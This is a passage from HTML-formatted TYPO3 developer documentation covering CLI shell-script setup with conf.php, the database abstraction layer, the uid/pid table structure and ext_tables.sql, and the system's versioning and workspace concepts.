<FONT COLOR="#ff8000"><FONT COLOR="#000000">  12:</FONT> &nbsp;&nbsp;&nbsp;&nbsp;// This will work as long as the script is called by it's absolute path!</FONT>
<FONT COLOR="#000000">  13:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(&quot;</FONT><FONT COLOR="#0000bb">PATH_thisScript&quot;</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#0000bb">$_ENV</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'_'</FONT><FONT COLOR="#007700">] ? </FONT><FONT COLOR="#0000bb">$_ENV</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'_'</FONT><FONT COLOR="#007700">] : </FONT><FONT COLOR="#0000bb">$_SERVER</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'_'</FONT><FONT COLOR="#007700">]);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  14:</FONT> </FONT>
<FONT COLOR="#000000">  15:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Include configuration file:</FONT></FONT>
<FONT COLOR="#000000">  16:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#007700">require(</FONT><FONT COLOR="#0000bb">dirname</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">PATH_thisScript</FONT><FONT COLOR="#007700">).</FONT><FONT COLOR="#dd0000">'/conf.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  17:</FONT> </FONT>
<FONT COLOR="#000000">  18:<FONT COLOR="#007700"> &nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// Include init file:</FONT></FONT>
<FONT COLOR="#000000">  19:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#007700">require(</FONT><FONT COLOR="#0000bb">dirname</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#0000bb">PATH_thisScript</FONT><FONT COLOR="#007700">).</FONT><FONT COLOR="#dd0000">'/'</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#0000bb">$BACK_PATH</FONT><FONT COLOR="#007700">.</FONT><FONT COLOR="#dd0000">'init.php'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  20:</FONT> </FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  21:</FONT> </FONT>
<FONT COLOR="#007700"><FONT COLOR="#000000">  22:</FONT> </FONT>
<FONT COLOR="#000000">  23:<FONT COLOR="#007700"> </FONT><FONT COLOR="#ff8000"># HERE you run your application!</FONT></FONT>
<FONT COLOR="#ff8000"><FONT COLOR="#000000">  24:</FONT> </FONT>
<FONT COLOR="#000000">  25:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#0000bb">?&gt;</FONT></FONT></PRE>
<UL>
	<LI><P CLASS="western">Line 1 will call the PHP binary to parse the
	script (just like a bash-script).</P>
	<LI><P CLASS="western">Line 9 defines “CLI” mode for TYPO3. When
	this is set browser checks are disabled and you can initialize a
	backend user with the name corresponding to the module name you set
	up in the conf.php file. See later.<BR>So you <B>MUST</B> set the
	CLI mode, otherwise you will get nowhere.</P>
	<LI><P CLASS="western">Line 13 defines the <I>absolute path</I> to
	this script! If for some reason the environment where the script is
	run does not offer this value in $HTTP_ENV_VARS['_'] you will have
	to find it elsewhere and manuall insert it. There seems to be no
	general solution for this problem.</P>
	<LI><P CLASS="western">Line 16 includes a configuration file build
	exactly like conf.php files for backend modules in extensions. (In
	fact this script must be registered as a backend module)</P>
	<LI><P CLASS="western">Line 19 includes the backend “init.php”
	file. 
	</P>
</UL>
<P CLASS="western">After these lines you have a backend environment
set up. The browser check was bypassed and a backend user named like
$MCONF['name'] was initialized. If something failed init.php will
exit with an error message. You can also execute the script with the
“status” command (eg. “/abs/path/to/typo3conf/ext/myext/
myphpshellscript.phpsh status”) to see which user was initialized,
which database found and which path the script runs from. This
indicates the success of the initialization.</P>
<H4 CLASS="western">conf.php file</H4>
<P CLASS="western">In the conf.php for the shell script you enter
TYPO3_MOD_PATH and backend as usual.</P>
<P CLASS="western">The $MCONF variable is also set with the module
name. This must be prefixed “_CLI_” and then a unique module
name, eg. based on the extension key. The value of $MCONF['name'] in
lowercase will be the backend username that is initialized
automatically in init.php for your sessions. This is hardcoded.</P>
<P CLASS="western">An example conf.php file looks like this:</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#000000">   0:<FONT COLOR="#0000bb"> &nbsp;&nbsp;&nbsp;&nbsp;</FONT><FONT COLOR="#ff8000">// DO NOT REMOVE OR CHANGE THESE 3 LINES:</FONT></FONT>
<FONT COLOR="#000000">   1:<FONT COLOR="#ff8000"> </FONT><FONT COLOR="#0000bb">define</FONT><FONT COLOR="#007700">(</FONT><FONT COLOR="#dd0000">'TYPO3_MOD_PATH'</FONT><FONT COLOR="#007700">, </FONT><FONT COLOR="#dd0000">'../typo3conf/ext/user_fi_io/cronmod/'</FONT><FONT COLOR="#007700">);</FONT></FONT>
<FONT COLOR="#000000">   2:<FONT COLOR="#007700"> </FONT><FONT COLOR="#0000bb">$BACK_PATH </FONT><FONT COLOR="#007700">= </FONT><FONT COLOR="#dd0000">'../../../../typo3/'</FONT><FONT COLOR="#007700">;</FONT></FONT>
<FONT COLOR="#000000">   3:<FONT COLOR="#007700"> </FONT><FONT COLOR="#0000bb">$MCONF</FONT><FONT COLOR="#007700">[</FONT><FONT COLOR="#dd0000">'name'</FONT><FONT COLOR="#007700">] = </FONT><FONT COLOR="#dd0000">'_CLI_userfiio'</FONT><FONT COLOR="#007700">;</FONT></FONT></PRE><P CLASS="western">
The backend user is then named “_cli_userfiio”:</P>
<P CLASS="western"><IMG SRC="10_html_1a9622f3.png" NAME="Graphic119" ALIGN=LEFT WIDTH=349 HEIGHT=92 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western"><B>Notice:</B> You must make sure to enter the
path of the “shell script module” in the ext_emconf.php scripts
array (key “module”). If you do this, the extension manager will
automatically fix the paths in the conf.php file when the extension
with your script is installed in either global / local scopes. This
is no different from ordinary backend modules which need the same
attension!</P>
<H4 CLASS="western">Running the script</H4>
<P CLASS="western">Any script configured like this can be run with
the “status” argument and you will see whether the initialization
went well:</P>
<PRE CLASS="western">agentk@rock:~$
agentk@rock:~$ /var/www/typo3/dev/3dsplm_live/typo3conf/ext/user_fi_io/cronmod/index.phpsh status
Status of TYPO3 CLI script:

Username [uid]: _cli_userfiio [17]
Database: t3_3dsplm_live
PATH_site: /var/www/typo3/dev/3dsplm_live/

<A HREF="mailto:agentk@rock">agentk@rock</A>:~$</PRE><H4 CLASS="western">
Natural limitations</H4>
<P CLASS="western">Since you are not running the script from a web
browser all backend operations that work on URLs or browser
information will not produce correct output. There simply is no URL
to get if you ask “t3lib_div::getIndpEnv()” for “TYPO3_SITE_URL”
or so!</P>
<P CLASS="western">You cannot expect to save session data for the
authenticated backend user since there is no session running with
cookies either. You should also remember that all operations done in
the script is done with the permissions of the “_cli_*” user that
was authenticated. So make sure to configure the user correctly. The
“_cli_” user is not allowed to be “admin” for security
reasons.</P>
<H2 CLASS="western"><A NAME="2.6.Database|outline"></A>Database</H2>
<H3 CLASS="western"><A NAME="2.6.1.Introduction|outline"></A>Introduction</H3>
<P CLASS="western">TYPO3 is centered around a RDB - a relational
database. This database has historically been MySQL and until version
3.6.0 of TYPO3 MySQL calls were hardcoded into TYPO3.</P>
<P CLASS="western">Today you can use other databases thanks to a
wrapper class in TYPO3, “t3lib_DB”. This class implements a
simple database API plus mysql-wrapper function calls which gives us
the following features:</P>
<UL>
	<LI><P CLASS="western">Backwards compatibility with old extensions</P>
	<LI><P CLASS="western">Easy migration to database abstraction for
	old extensions</P>
	<LI><P CLASS="western">Offering the opportunity of applying a DBAL
	(DataBase Abstraction Layer) as an extension (thus offering
	connectivity to other databases / information sources)</P>
	<UL>
		<LI><P CLASS="western">A DBAL can simply implement storage in other
		RDBs</P>
		<LI><P CLASS="western">Or it could be a simulation of a RDB while
		actually storing information totally different, like in XML files.</P>
		<LI><P CLASS="western">Or you create a simulation of the “be_users”
		table while looking up information in LDAP instead.</P>
	</UL>
	<LI><P CLASS="western">Keeping a minimal overhead (in the range of
	5%) for plain MySQL usage (which is probably what most TYPO3 based
	solutions is running anyway)</P>
</UL>
<P CLASS="western">In other words; TYPO3 is optimized for MySQL but
can perform with any information source for which someone will write
a “driver”. Such drivers can easily be implemented as extensions
thus offering other developers a chance to implement a full blown
DBAL for TYPO3 in an extension - or for the local TYPO3 project this
can offer improvised implementation of eg. XML database sources or
whatever.</P>
<H3 CLASS="western"><A NAME="2.6.2.Relational Database Structure|outline"></A>
Relational Database Structure</H3>
<P CLASS="western">Despite TYPO3s API for database connectivity which
allows you to store information in eg. XML files instead of MySQL
there is still a basic principle in any case; for TYPO3 internally
every “data source” is expected to work as a flat database table
with a number of fields inside and upon which you can perform
queries! In other words; The DBAL can hide the actual storage mode
for TYPO3 totally but internally TYPO3 <I>always</I> expects to
select, update, insert and delete the equivalent of database records
stored in tables!</P>
<P CLASS="western">For the rest of this section I will refer to
“tables”, “fields” and “records” as if the data storage
truly is a Relational Database despite that it might be an XML file
depending on your current DBAL.</P>
<H4 CLASS="western">Requirements for TYPO3 managed tables</H4>
<P CLASS="western">When you want TYPO3 to manage a table for you
there are certain requirements. 
</P>
<UL>
	<LI><P CLASS="western">The table must be configured in the global
	array, $TCA (See “TYPO3 Core API” for details) - this will tell
	TYPO3 things like the table name, features you have configured, the
	fields of the table and how to render these in the backend,
	relations to other tables etc.</P>
	<LI><P CLASS="western">You must add at least these fields:</P>
	<UL>
		<LI><P CLASS="western">“uid” - an auto-incremented integer, 
		PRIMARY key, for the table, containing the <I>unique</I> ID of the
		record in the table.</P>
		<LI><P CLASS="western">“pid” - an integer pointing to the “uid”
		of the page (record from “pages”  table) to which the record
		belongs.</P>
		<LI><P CLASS="western"><I>any other fields you like .... typically
		at least:</I></P>
		<UL>
			<LI><P CLASS="western" STYLE="font-style: normal">A title field
			holding the records title as seen in the backend</P>
			<LI><P CLASS="western" STYLE="font-style: normal">A tstamp field
			holding the last modification time of the record</P>
			<LI><P CLASS="western" STYLE="font-style: normal">A sorting order
			field if records are sorted manually</P>
			<LI><P CLASS="western" STYLE="font-style: normal">A “deleted”
			field which tells TYPO3 that the record is deleted (if set)</P>
		</UL>
	</UL>
</UL>
<H4 CLASS="western">The “pages” table</H4>
<P CLASS="western">One table which has a special status is the
“pages” table. This table is the backbone of TYPO3 as it provides
the hierarchical page structure into which all other TYPO3 managed
records are positioned. 
</P>
<P CLASS="western">You can understand the “pages” table as
folders on a hard disc and all other records (configured in $TCA) as
files which can belong to one of these folders. As a unique
identification of any record, “pages” record or otherwise, the
“uid” field contains an integer value. And for any record the
“pid” field is like the “path” in the file system telling
which “page” the record belongs to.</P>
<P CLASS="western">Thus records in the “pages” table has a “pid”
value which points to their “parent page” - the page record they
belong to.</P>
<P CLASS="western">If a page (or record from another table) is found
in the “Root” they have the “pid” 0 (zero).</P>
<P CLASS="western">Only admin-users can access records in the root.
Also records from tables can normally only be created on a real page
<I>or</I> in the root (unless configured otherwise).</P>
<H4 CLASS="western">Other tables</H4>
<P CLASS="western">There are other tables in TYPO3 which are not
subject to the uid/pid scheme as described above. But these tables
are not possible to edit in TYPO3s standard interface
(TCEforms/TCEmain). For instance such a table could be the “sys_log”
table which is automatically written to each time you update
something in TYPO3. Or the “be_sessions” table containing user
sessions.</P>
<P CLASS="western">Generally:</P>
<UL>
	<LI><P CLASS="western">If a table is configured in $TCA, then it
	<I>must</I> have the “uid” and “pid” fields as outlined
	above. Tables configured in $TCA can be edited in the backend of
	TYPO3 and organized in the page tree.</P>
	<LI><P CLASS="western">If a table is not configured in $TCA it means
	the table is “hidden” to the backend user - such tables are
	controlled by the application logic automatically in some way or
	another.</P>
</UL>
<H3 CLASS="western"><A NAME="2.6.3.Upgrade table/field definitions|outline"></A>
Upgrade table/field definitions</H3>
<P CLASS="western">When you upgrade to newer versions of TYPO3 or any
extension in TYPO3 the requirements to the database tables and fields
might have changed. However TYPO3 handles this automatically. If a
new field or table has been added or changed the Install Tool in
TYPO3 will detect that and warn you. When you install extensions, you
will be warned as a part of the process when the extension is
installed. When you upgrade the TYPO3 core source code you will have
to manually trigger the validation functions inside the Install Tool:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_60ec7b2f.png" NAME="Graphic107" ALIGN=LEFT WIDTH=388 HEIGHT=310 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The step you should always take is to click the
&quot;COMPARE&quot; link for &quot;Update required tables&quot; in
the Install Tool. Now TYPO3 will search for the file &quot;ext_tables.sql&quot;
in <I>all</I> installed extensions, add them together with the core
requirements (t3lib/stddb/tables.sql) and take that as the complete
expression of the database structure TYPO3 requires. Then TYPO3 will
ask the database for the actual table / field structure and compare
them. Any fields that has been added or changed will be shown and new
tables can be created in the interface that pops up:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_237bdc50.png" NAME="Graphic108" ALIGN=LEFT WIDTH=669 HEIGHT=675 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">A single click on a button in the bottom of the
screen will carry out these changes for you! 
</P>
<P CLASS="western">As you can also see you will be told if tables or
fields are not used any more. You can also choose to delete those if
you like but it is not vital for the system to function correctly.</P>
<P CLASS="western">If the database matches exactly with the combined
requirements of core and extensions you will see this message:</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><IMG SRC="10_html_497f7a01.png" NAME="Graphic109" ALIGN=LEFT WIDTH=479 HEIGHT=112 BORDER=0><BR CLEAR=LEFT><BR><BR>
</P>
<P CLASS="western">The class that contains code for comparing SQL
files with the database is &quot;t3lib/class.t3lib_install.php&quot;.</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western"><BR><BR>
</P>
<H4 CLASS="western">The ext_tables.sql files</H4>
<P CLASS="western">Each extension might provide requirements for
tables and/or fields in the database. This is done from the
ext_tables.sql file. But the file is not (always) a valid SQL dump.
In this case taken from the extension &quot;TemplaVoila&quot; you can
see a full table definition at first. This can be piped to MySQL and
a new table will be created.</P>
<P CLASS="western">But the second &quot;CREATE TABLE&quot; definition
is incomplete. This is on purpose because it actually adds four new
fields to the already existing table &quot;tt_content&quot;. 
</P>
<P CLASS="western">When the Install Tool reads the &quot;ext_tables.sql&quot;
files it will automatically read these four lines and add them to the
previously defined requirements for the &quot;tt_content&quot; table.</P>
<P CLASS="western"><BR><BR>
</P>
<PRE CLASS="western"><FONT COLOR="#808080"><I>#</I></FONT>
<FONT COLOR="#808080"><I># Table structure for table 'tx_templavoila_datastructure'</I></FONT>
<FONT COLOR="#808080"><I>#</I></FONT>
CREATE TABLE tx_templavoila_datastructure (
	uid <FONT COLOR="#800000">int</FONT>(<FONT COLOR="#0000ff">11</FONT>) <B>unsigned DEFAULT</B> '0' <B>NOT NULL auto_increment</B>,
	pid <FONT COLOR="#800000">int</FONT>(<FONT COLOR="#0000ff">11</FONT>) <B>unsigned DEFAULT</B> '0' <B>NOT NULL</B>,
	tstamp <FONT COLOR="#800000">int</FONT>(<FONT COLOR="#0000ff">11</FONT>) <B>unsigned DEFAULT</B> '0' <B>NOT NULL</B>,
	crdate <FONT COLOR="#800000">int</FONT>(<FONT COLOR="#0000ff">11</FONT>) <B>unsigned DEFAULT</B> '0' <B>NOT NULL</B>,
	cruser_id <FONT COLOR="#800000">int</FONT>(<FONT COLOR="#0000ff">11</FONT>) <B>unsigned DEFAULT</B> '0' <B>NOT NULL</B>,
	deleted <FONT COLOR="#800000">tinyint</FONT>(<FONT COLOR="#0000ff">4</FONT>) <B>unsigned DEFAULT</B> '0' <B>NOT NULL</B>,
	title <FONT COLOR="#800000">varchar</FONT>(<FONT COLOR="#0000ff">60</FONT>) <B>DEFAULT</B> '' <B>NOT NULL</B>,
	dataprot <FONT COLOR="#800000">mediumtext</FONT> <B>NOT NULL</B>,
	scope <FONT COLOR="#800000">tinyint</FONT>(<FONT COLOR="#0000ff">4</FONT>) <B>unsigned DEFAULT</B> '0' <B>NOT NULL</B>,
	previewicon <FONT COLOR="#800000">tinytext</FONT> <B>NOT NULL</B>,
	
	<B>PRIMARY KEY</B> (uid),
	<B>KEY</B> parent (pid)
);

<FONT COLOR="#808080"><I>#</I></FONT>
<FONT COLOR="#808080"><I># Table structure for table 'tt_content'</I></FONT>
<FONT COLOR="#808080"><I>#</I></FONT>
CREATE TABLE tt_content (
	tx_templavoila_ds <FONT COLOR="#800000">varchar</FONT>(<FONT COLOR="#0000ff">100</FONT>) <B>DEFAULT</B> '' <B>NOT NULL</B>,
	tx_templavoila_to <FONT COLOR="#800000">int</FONT>(<FONT COLOR="#0000ff">11</FONT>) <B>DEFAULT</B> '0' <B>NOT NULL</B>,
    tx_templavoila_flex <FONT COLOR="#800000">mediumtext</FONT> <B>NOT NULL</B>,
    tx_templavoila_pito <FONT COLOR="#800000">int</FONT>(<FONT COLOR="#0000ff">11</FONT>) <B>DEFAULT</B> '0' <B>NOT NULL</B>
);
</PRE><H4 CLASS="western">
The upgrade process</H4>
<P CLASS="western">More information about the process of upgrading
TYPO3 can be found in the document <A HREF="/home/shafiq/Sites/typo3/doc_inst_upgr/doc/manual.sxw#Upgrade%7Coutline">&quot;Installing
and Upgrading TYPO3&quot;</A>.</P>
<H2 CLASS="western"><A NAME="2.7.Versioning and Workspaces|outline"></A>
Versioning and Workspaces</H2>
<H3 CLASS="western"><A NAME="2.7.1.Versioning in TYPO3|outline"></A>Versioning
in TYPO3</H3>
<P CLASS="western">TYPO3 offers versioning of the database elements
it manages. This versioning system allows you to work on future
versions of content without affecting the live content. It is used by
workflow systems to offer a process for such content, going from
creation, editing to review and publishing (where the draft version
is swapped with the live version).</P>
<P CLASS="western">Versioning is available in the core API by
default, but to gain access to management tools you must install an
extension, eg. the system extension “versioning”.</P>
<P CLASS="western">The versioning system offers three types of
versioning fitting various scenarios:</P>
<UL>
	<LI><P CLASS="western"><B>Element:</B> A single database record from
	any table with versioning enabled is copied and configured as a
	future version of the original element. Color code is light green.</P>
	<LI><P CLASS="western"><B>Page:</B> A single page record is
	versioned and other content on the page (tables with
	“versioning_followPages” set in [ctrl]) is copied along. Color
	code is light blue. 
	</P>
	<LI><P CLASS="western"><B>Branch:</B> A single page record is
	versioned and subpages to a specified depth including content is
	copied along. Color code is light red.</P>
</UL>
<P CLASS="western">Here are some explanation why three types are
necessary to gain the most flexibility:</P>
<P CLASS="western">“Element” versions are the most basic form and
also the simplest. Whenever possible I would prefer this type because
of the simplicity. However “Element” versions cannot easily take
their environment into account, but recent development (TYPO3 4.2+)
also allows moving elements and pages now so its improving.</P>
<P CLASS="western">Changing the order of for example content elements
on a page is a very common way to re-organize page content. Therefore
the versioning type “Page” means that some page content is copied
along with the page version and thereby freely re-arrangeable.
Furthermore, the process of versioning is necessary only one time for
the page and not for each element on it that is changed. The downside
to this method is that more content than necessary is copied and when
the page versions are swapped, the new content elements on the page
will have different UIDs than the former (breaking all links with
anchors or “Insert Record”/TemplaVoila references to content
elements on the former page ). The “Page” versioning type is most
useful for columns-based websites, while TemplaVoila based sites can
benefit more from the element-based versioning, especially in the
context of workspaces where versioning is transparently done. <I>Due
to the recent development of moving for “Element” versioning
“Page” versioning is obsolete and deprecated!</I></P>
<P CLASS="western">Finally, the “Branch” versioning type is used
if you want to rework a whole branch of the page tree of a site. This
gives you flexibility in terms of adding, deleting, moving and
copying elements around. But on the other hand you suffer the same
problems of “Page” versioning where you might break links and
other id-references since all content below the versioned page “root
point” will be separate copies of original content without any
references back to their originals. You will loose not only
anchor-point references but also links to page IDs! As it is right
now I consider this type most useful for building new sections of a
website or major rearrangements of sections where these consequences
are acceptable. Yet, it remains to be seen what actual usage people
will make of it. <I>Due to the recent development of moving for
“Element” versioning “Branch” versioning is obsolete and
deprecated!</I></P>
<P CLASS="western"><I><B>It is recommended not to use “Page” or
“Branch” versioning, but “Element” versioning instead.</B></I></P>
<H4 CLASS="western">Technical details</H4>
<P CLASS="western">Versioning must be enabled on a per-table basis in
the [ctrl] section of the $TCA array entry for a table. In addition a
fixed set of fields has to exist for the management of versions. All
of these technical details are specified in the document “TYPO3
Core API” where you will also find other in-depth information.</P>
<P CLASS="western">Future and past versions of records in TYPO3
remain in the same table as the live version. However, all “offline”
versions will have a pid value of “-1” which identifies them as
“offline”. Further they have a field, “t3ver_oid” which
points to their live (“online”) version.</P>
<P CLASS="western">When a future/past version is swapped with the
live version it is done by <I>swapping all field values except the
uid and pid</I> fields (and of course versioning related fields are
manipulated according to their function). It means that online
content is always identified by the same id as before and therefore
all references are kept intact (except content inside “Page” and
“Branch” versioning, see above).</P>
<P CLASS="western">Versioning is easy for existing elements. However,
moving, creating and deleting poses other problems. This is solved
the following way:</P>
<UL>
	<LI><P CLASS="western">Deleting elements is done by actually
	creating a new version of the element <I>and </I>setting a flag in
	the new version (t3ver_state=2) that indicates the live element must
	be deleted upon swapping the versions. Thus deletion is “scheduled”
	to happen when the versions are swapped.</P>
	<LI><P CLASS="western">Creating elements is done by first creating a
	placeholder element which is in fact live but carrying a flag
	(t3ver_state=1) that makes it invisible online. Then a new version
	of this placeholder is made which is what is modified until
	published.</P>
	<LI><P CLASS="western">Moving elements is done by first creating a
	placeholder element which is in fact live but carrying a flag
	(t3ver_state=3) that makes it invisible online. It also has a field,
	“t3ver_move_id”, holding the uid of the record to move (source
	record). In addition, a new version of the source record is made and
	has “t3ver_state” = 4 (move-to pointer). This version is simply
	necessary in order for the versioning system to have something to
	publish for the move operation. So in summary, two records are
	created for a move operation in a workspace: The placeholder
	(online, with state=3 and t3ver_move_id set) and a new version
	(state=4) of the online source record (the one being moved).</P>
</UL>
<H4 CLASS="western">Unique fields</H4>
<P CLASS="western">Unique fields like a page alias or user name are
tricky in a versioning scenario because the publication process must
perform a check if the field is unique in the “Live” situation.
The implications of implementing this means that we have chosen a
solution where unique fields are simply not swapped at all! It means
that publication of a new version of a page cannot and will not alter
the alias of the live version. The “Live” unique value will
remain until changed in the live version. 
</P>
<P CLASS="western">You can hide fields with the “unique” keyword
when they are offline versions. This is done with the display
condition:</P>
<PRE CLASS="western" STYLE="margin-bottom: 0.5cm"><FONT COLOR="#dd0000">'displayCond'</FONT> =&gt; <FONT COLOR="#dd0000">'VERSION:IS:false'</FONT><FONT COLOR="#008000">,</FONT></PRE><H4 CLASS="western">
Life cycle</H4>
<P CLASS="western">When a new version of an element is created, its
publishing counter (t3ver_count) is set to zero. This means its life
cycle state is interpreted as “Draft”; the element is in the
pipeline to be published. When the element is published the life
cycle state is “Live” and when it is swapped out again the
publishing counter will be incremented and the life cycle is
interpreted as “Archive”. Yet, the element can be continously
published and unpublished and for each time the publishing counter
will be incremented, telling how many times an element has been
online.</P>
<H4 CLASS="western">Permissions</H4>
<P CLASS="western">This is an overview of how permissions are handled
in relation to versioning:</P>
<UL>
	<LI><P CLASS="western"><B>Display</B></P>
	<UL>
		<LI><P CLASS="western">Read permissions are evaluated based on the
		live version of pages (as the basic rule). The read permissions of
		the offline page version in a workspace is not observed. (Reason:
		When for example the page tree is generated TYPO3 selects all live
		records and then looks for versioned overlays).</P>
		<LI><P CLASS="western">Read permissions for new page versions of
		“branch” type is observed in eg. Web &gt; List module. This is
		due to the fact that the real ID of a “branch” type page is
		what the backend uses in the Web&gt;List module while for “page”
		and “Element” type versions the ID of the live record is used
		in which case the live records display-permissions is what gets
		evaluated.</P>
	</UL>
	<LI><P CLASS="western"><B>Versioning records</B></P>
	<UL>
		<LI><P CLASS="western">To create a new version the user must have
		read permission to the live record he requests to version</P>
		<LI><P CLASS="western">A new version of a page will inherit the
		owner user, group and permission settings from the live record</P>
		<LI><P CLASS="western">To create a &quot;Page&quot; or &quot;Branch&quot;
		version of a page requires read permission to all subpages. All
		records that should be copied along with &quot;Page&quot; and
		&quot;Branch&quot; versions will be so regardless of the users
		table-modify permissions.</P>
	</UL>
	<LI><P CLASS="western"><B>Publishing version</B></P>
	<UL>
		<LI><P CLASS="western">To publish, a user must have general
		publishing permission in the workspace, for instance be the owner
		of it or have access to the Live workspace.</P>
		<LI><P CLASS="western">In addition, the user must have read and
		edit access to the offline version being published plus edit access
		to the <I>live version</I> that a publishing action will
		substitute! 
		</P>
		<LI><P CLASS="western">The permissions of a new version of a page
		follows the page when published.</P>
	</UL>
	<LI><P CLASS="western"><B>Editing records</B></P>
	<UL>
		<LI><P CLASS="western">For all editing it is required that the
		stage of the versioned record (or root point) allows editing.</P>
		<LI><P CLASS="western">Page records: 
		</P>
		<UL>
			<LI><P CLASS="western">Permission to edit is always evaluated
			based on the pages own permission settings and not the live
			records.</P>
		</UL>
		<LI><P CLASS="western">Records from non-pages tables:</P>
		<UL>
			<LI><P CLASS="western">&quot;Element&quot; versions: Always based
			on the live parent page.</P>
			<LI><P CLASS="western">Live records inside a &quot;Branch&quot; or
			&quot;Page&quot; versioning type immediately under the root point
			depends on permissions of the root point offline version.</P>
		</UL>
	</UL>
	<LI><P CLASS="western"><B>New records</B></P>
	<UL>
		<LI><P CLASS="western">When new records are created with a version
		and live place holder the permissions depend on the live page under
		which the record is created.</P>
	</UL>
	<LI><P CLASS="western"><B>Moving records</B></P>
	<UL>
		<LI><P CLASS="western">Records can be moved as long as the source
		and destination root points has a stage that allows it.</P>
		<LI><P CLASS="western">New records created with a place holder
		element can be moved freely around except into other &quot;Page&quot;
		and &quot;Branch&quot; versions.</P>
		<LI><P CLASS="western">Generally, the stage of a moved record has
		to allow for editing plus regular permissions for moving are
		observed.</P>
	</UL>
	<LI><P CLASS="western"><B>Deleting records</B></P>
	<UL>
		<LI><P CLASS="western">If the record is inside a &quot;Page&quot;
		or &quot;Branch&quot; type version of a page, then it can be
		readily deleted if other permissions allow, including stage of the
		root point.</P>
		<LI><P CLASS="western">If a record is outside a versioned branch
		and supports versioning it will be marked for deletion if all usual
		requirements are fulfilled at the time of the delete request:
		Delete access to record, that no subpages are found if not
		recursive deletion is enabled and no disallowed table records are
		found. As soon as the record is marked for deletion any change to
		the record and subpages that would otherwise prevent deletion for
		the user will not be effective: The record <I>will </I>be deleted
		upon publication!</P>
		<LI><P CLASS="western">If you try to delete a Live record for which
		a version is found in the workspace, that version is deleted
		instead. 
		</P>
	</UL>
	<LI><P CLASS="western">Detaching versions from a workspace and
	raising stage of versions can be done as long as the user has edit
	permission to the record.</P>
</UL>
<P CLASS="western"><BR><BR>
</P>
<H3 CLASS="western"><A NAME="2.7.2.Workspaces|outline"></A>Workspaces</H3>
<H4 CLASS="western">Problems with versioning usability</H4>
<P CLASS="western">One problem with raw versioning is that it easily
requires a lot of administration and awareness from users. For
instance, an author has to consciously create a new version of a page
or content element before he must edit it. Maybe he forgets. So
either he makes a change live or - if TYPO3 is configured for it - he
will be denied access to editing but frustrated over an error
message. Further, keeping track of versions across the system might
be difficult since changes are often made at various places and
should be published together. 
</P>
<P CLASS="western">Some of these problems are fixed when elements are
always processed with a workflow that keeps track of them. But a
workflow process might be too rigid for scenarios where a group of
editors are concerned with the site content broadly and not the
narrow scope of an element centred workflow.</P>
<P CLASS="western">Furthermore, the preview of future content is hard
to implement unless you require people to request a preview of each
individual new version - but most often they like to see the combined
impact of all future versions!</P>
<H4 CLASS="western">The perfect solution</H4>
<P CLASS="western">The concept of workspaces is the answer.
Workspaces puts versioning into action in a very usable and
transparent way offering all the flexibility from live editing but
without sacrificing the important control of content publishing and
review.</P>
<P CLASS="western">A workspace is a state in the backend of TYPO3.
Basically there are three types of workspaces:</P>
<UL>
	<LI><P CLASS="western">LIVE workspace: This is exactly the state
	TYPO3 has always been in. Any change you make will be instantly
	live. Nothing has changed, it just got a name.</P>
	<LI><P CLASS="western">Draft workspace: When a user selects the
	draft workspace new rules apply to anything he does in the backend:</P>
	<UL>
		<LI><P CLASS="western">Draft: Any change he tries to make will not
		affect the live website. It's a safe playground.</P>
		<LI><P CLASS="western">Transparent versioning: He can edit pages
		and elements because a new version is made automatically and
		attached to the workspace. No training needed, no administrative
		overhead!</P>
		<LI><P CLASS="western">Previewing: Visiting the frontend website
		will display it as it will appear when all versions in the
		workspace is eventually published (switch enable/disable this
		feature). 
		</P>
		<LI><P CLASS="western">Overview of changes: The workspace manager
		module gives a clear overview of all changes that has been made
		inside the workspace across the site. This gives unparalleled
		control before publishing the content live.</P>
		<LI><P CLASS="western">Constraints: Only tables that support
		versioning can be edited. All management of files in fileadmin/ is
		disabled because they may affect the live website and thus would
		break the principle of “safe playground”.</P>
	</UL>
	<LI><P CLASS="western">Custom workspaces: 
	</P>
	<UL>
		<LI><P CLASS="western">Inherits all properties of the default
		“Draft workspace” but can be configured additionally with
		owners, members and reviewers plus database- and file mounts plus
		other settings. A custom workspace is a great way to do team-based
		maintenance of (a section of) the website including a basic
		implementation of workflow states with editor-reviewer-publisher.</P>
		<LI><P CLASS="western">Some of the constraints of the default draft
		workspace can be eased up a bit by configuration; For instance
		records that does not support versioning can be allowed to be
		edited and file mounts can be defined inside of which files <I>can</I>
		be managed.</P>
	</UL>
</UL>
<P CLASS="western"><BR><BR>
</P>
<P CLASS="western">A draft workspace is a container for draft
versions of content. Each versionable element can have zero or 1
version in a workspace (versions are attached to workspaces with a
relation in the field “t3ver_wsid”). The fact that there can be
only one new version of any element in a draft workspace makes in
unambiguous which version to edit, preview and publish.</P>
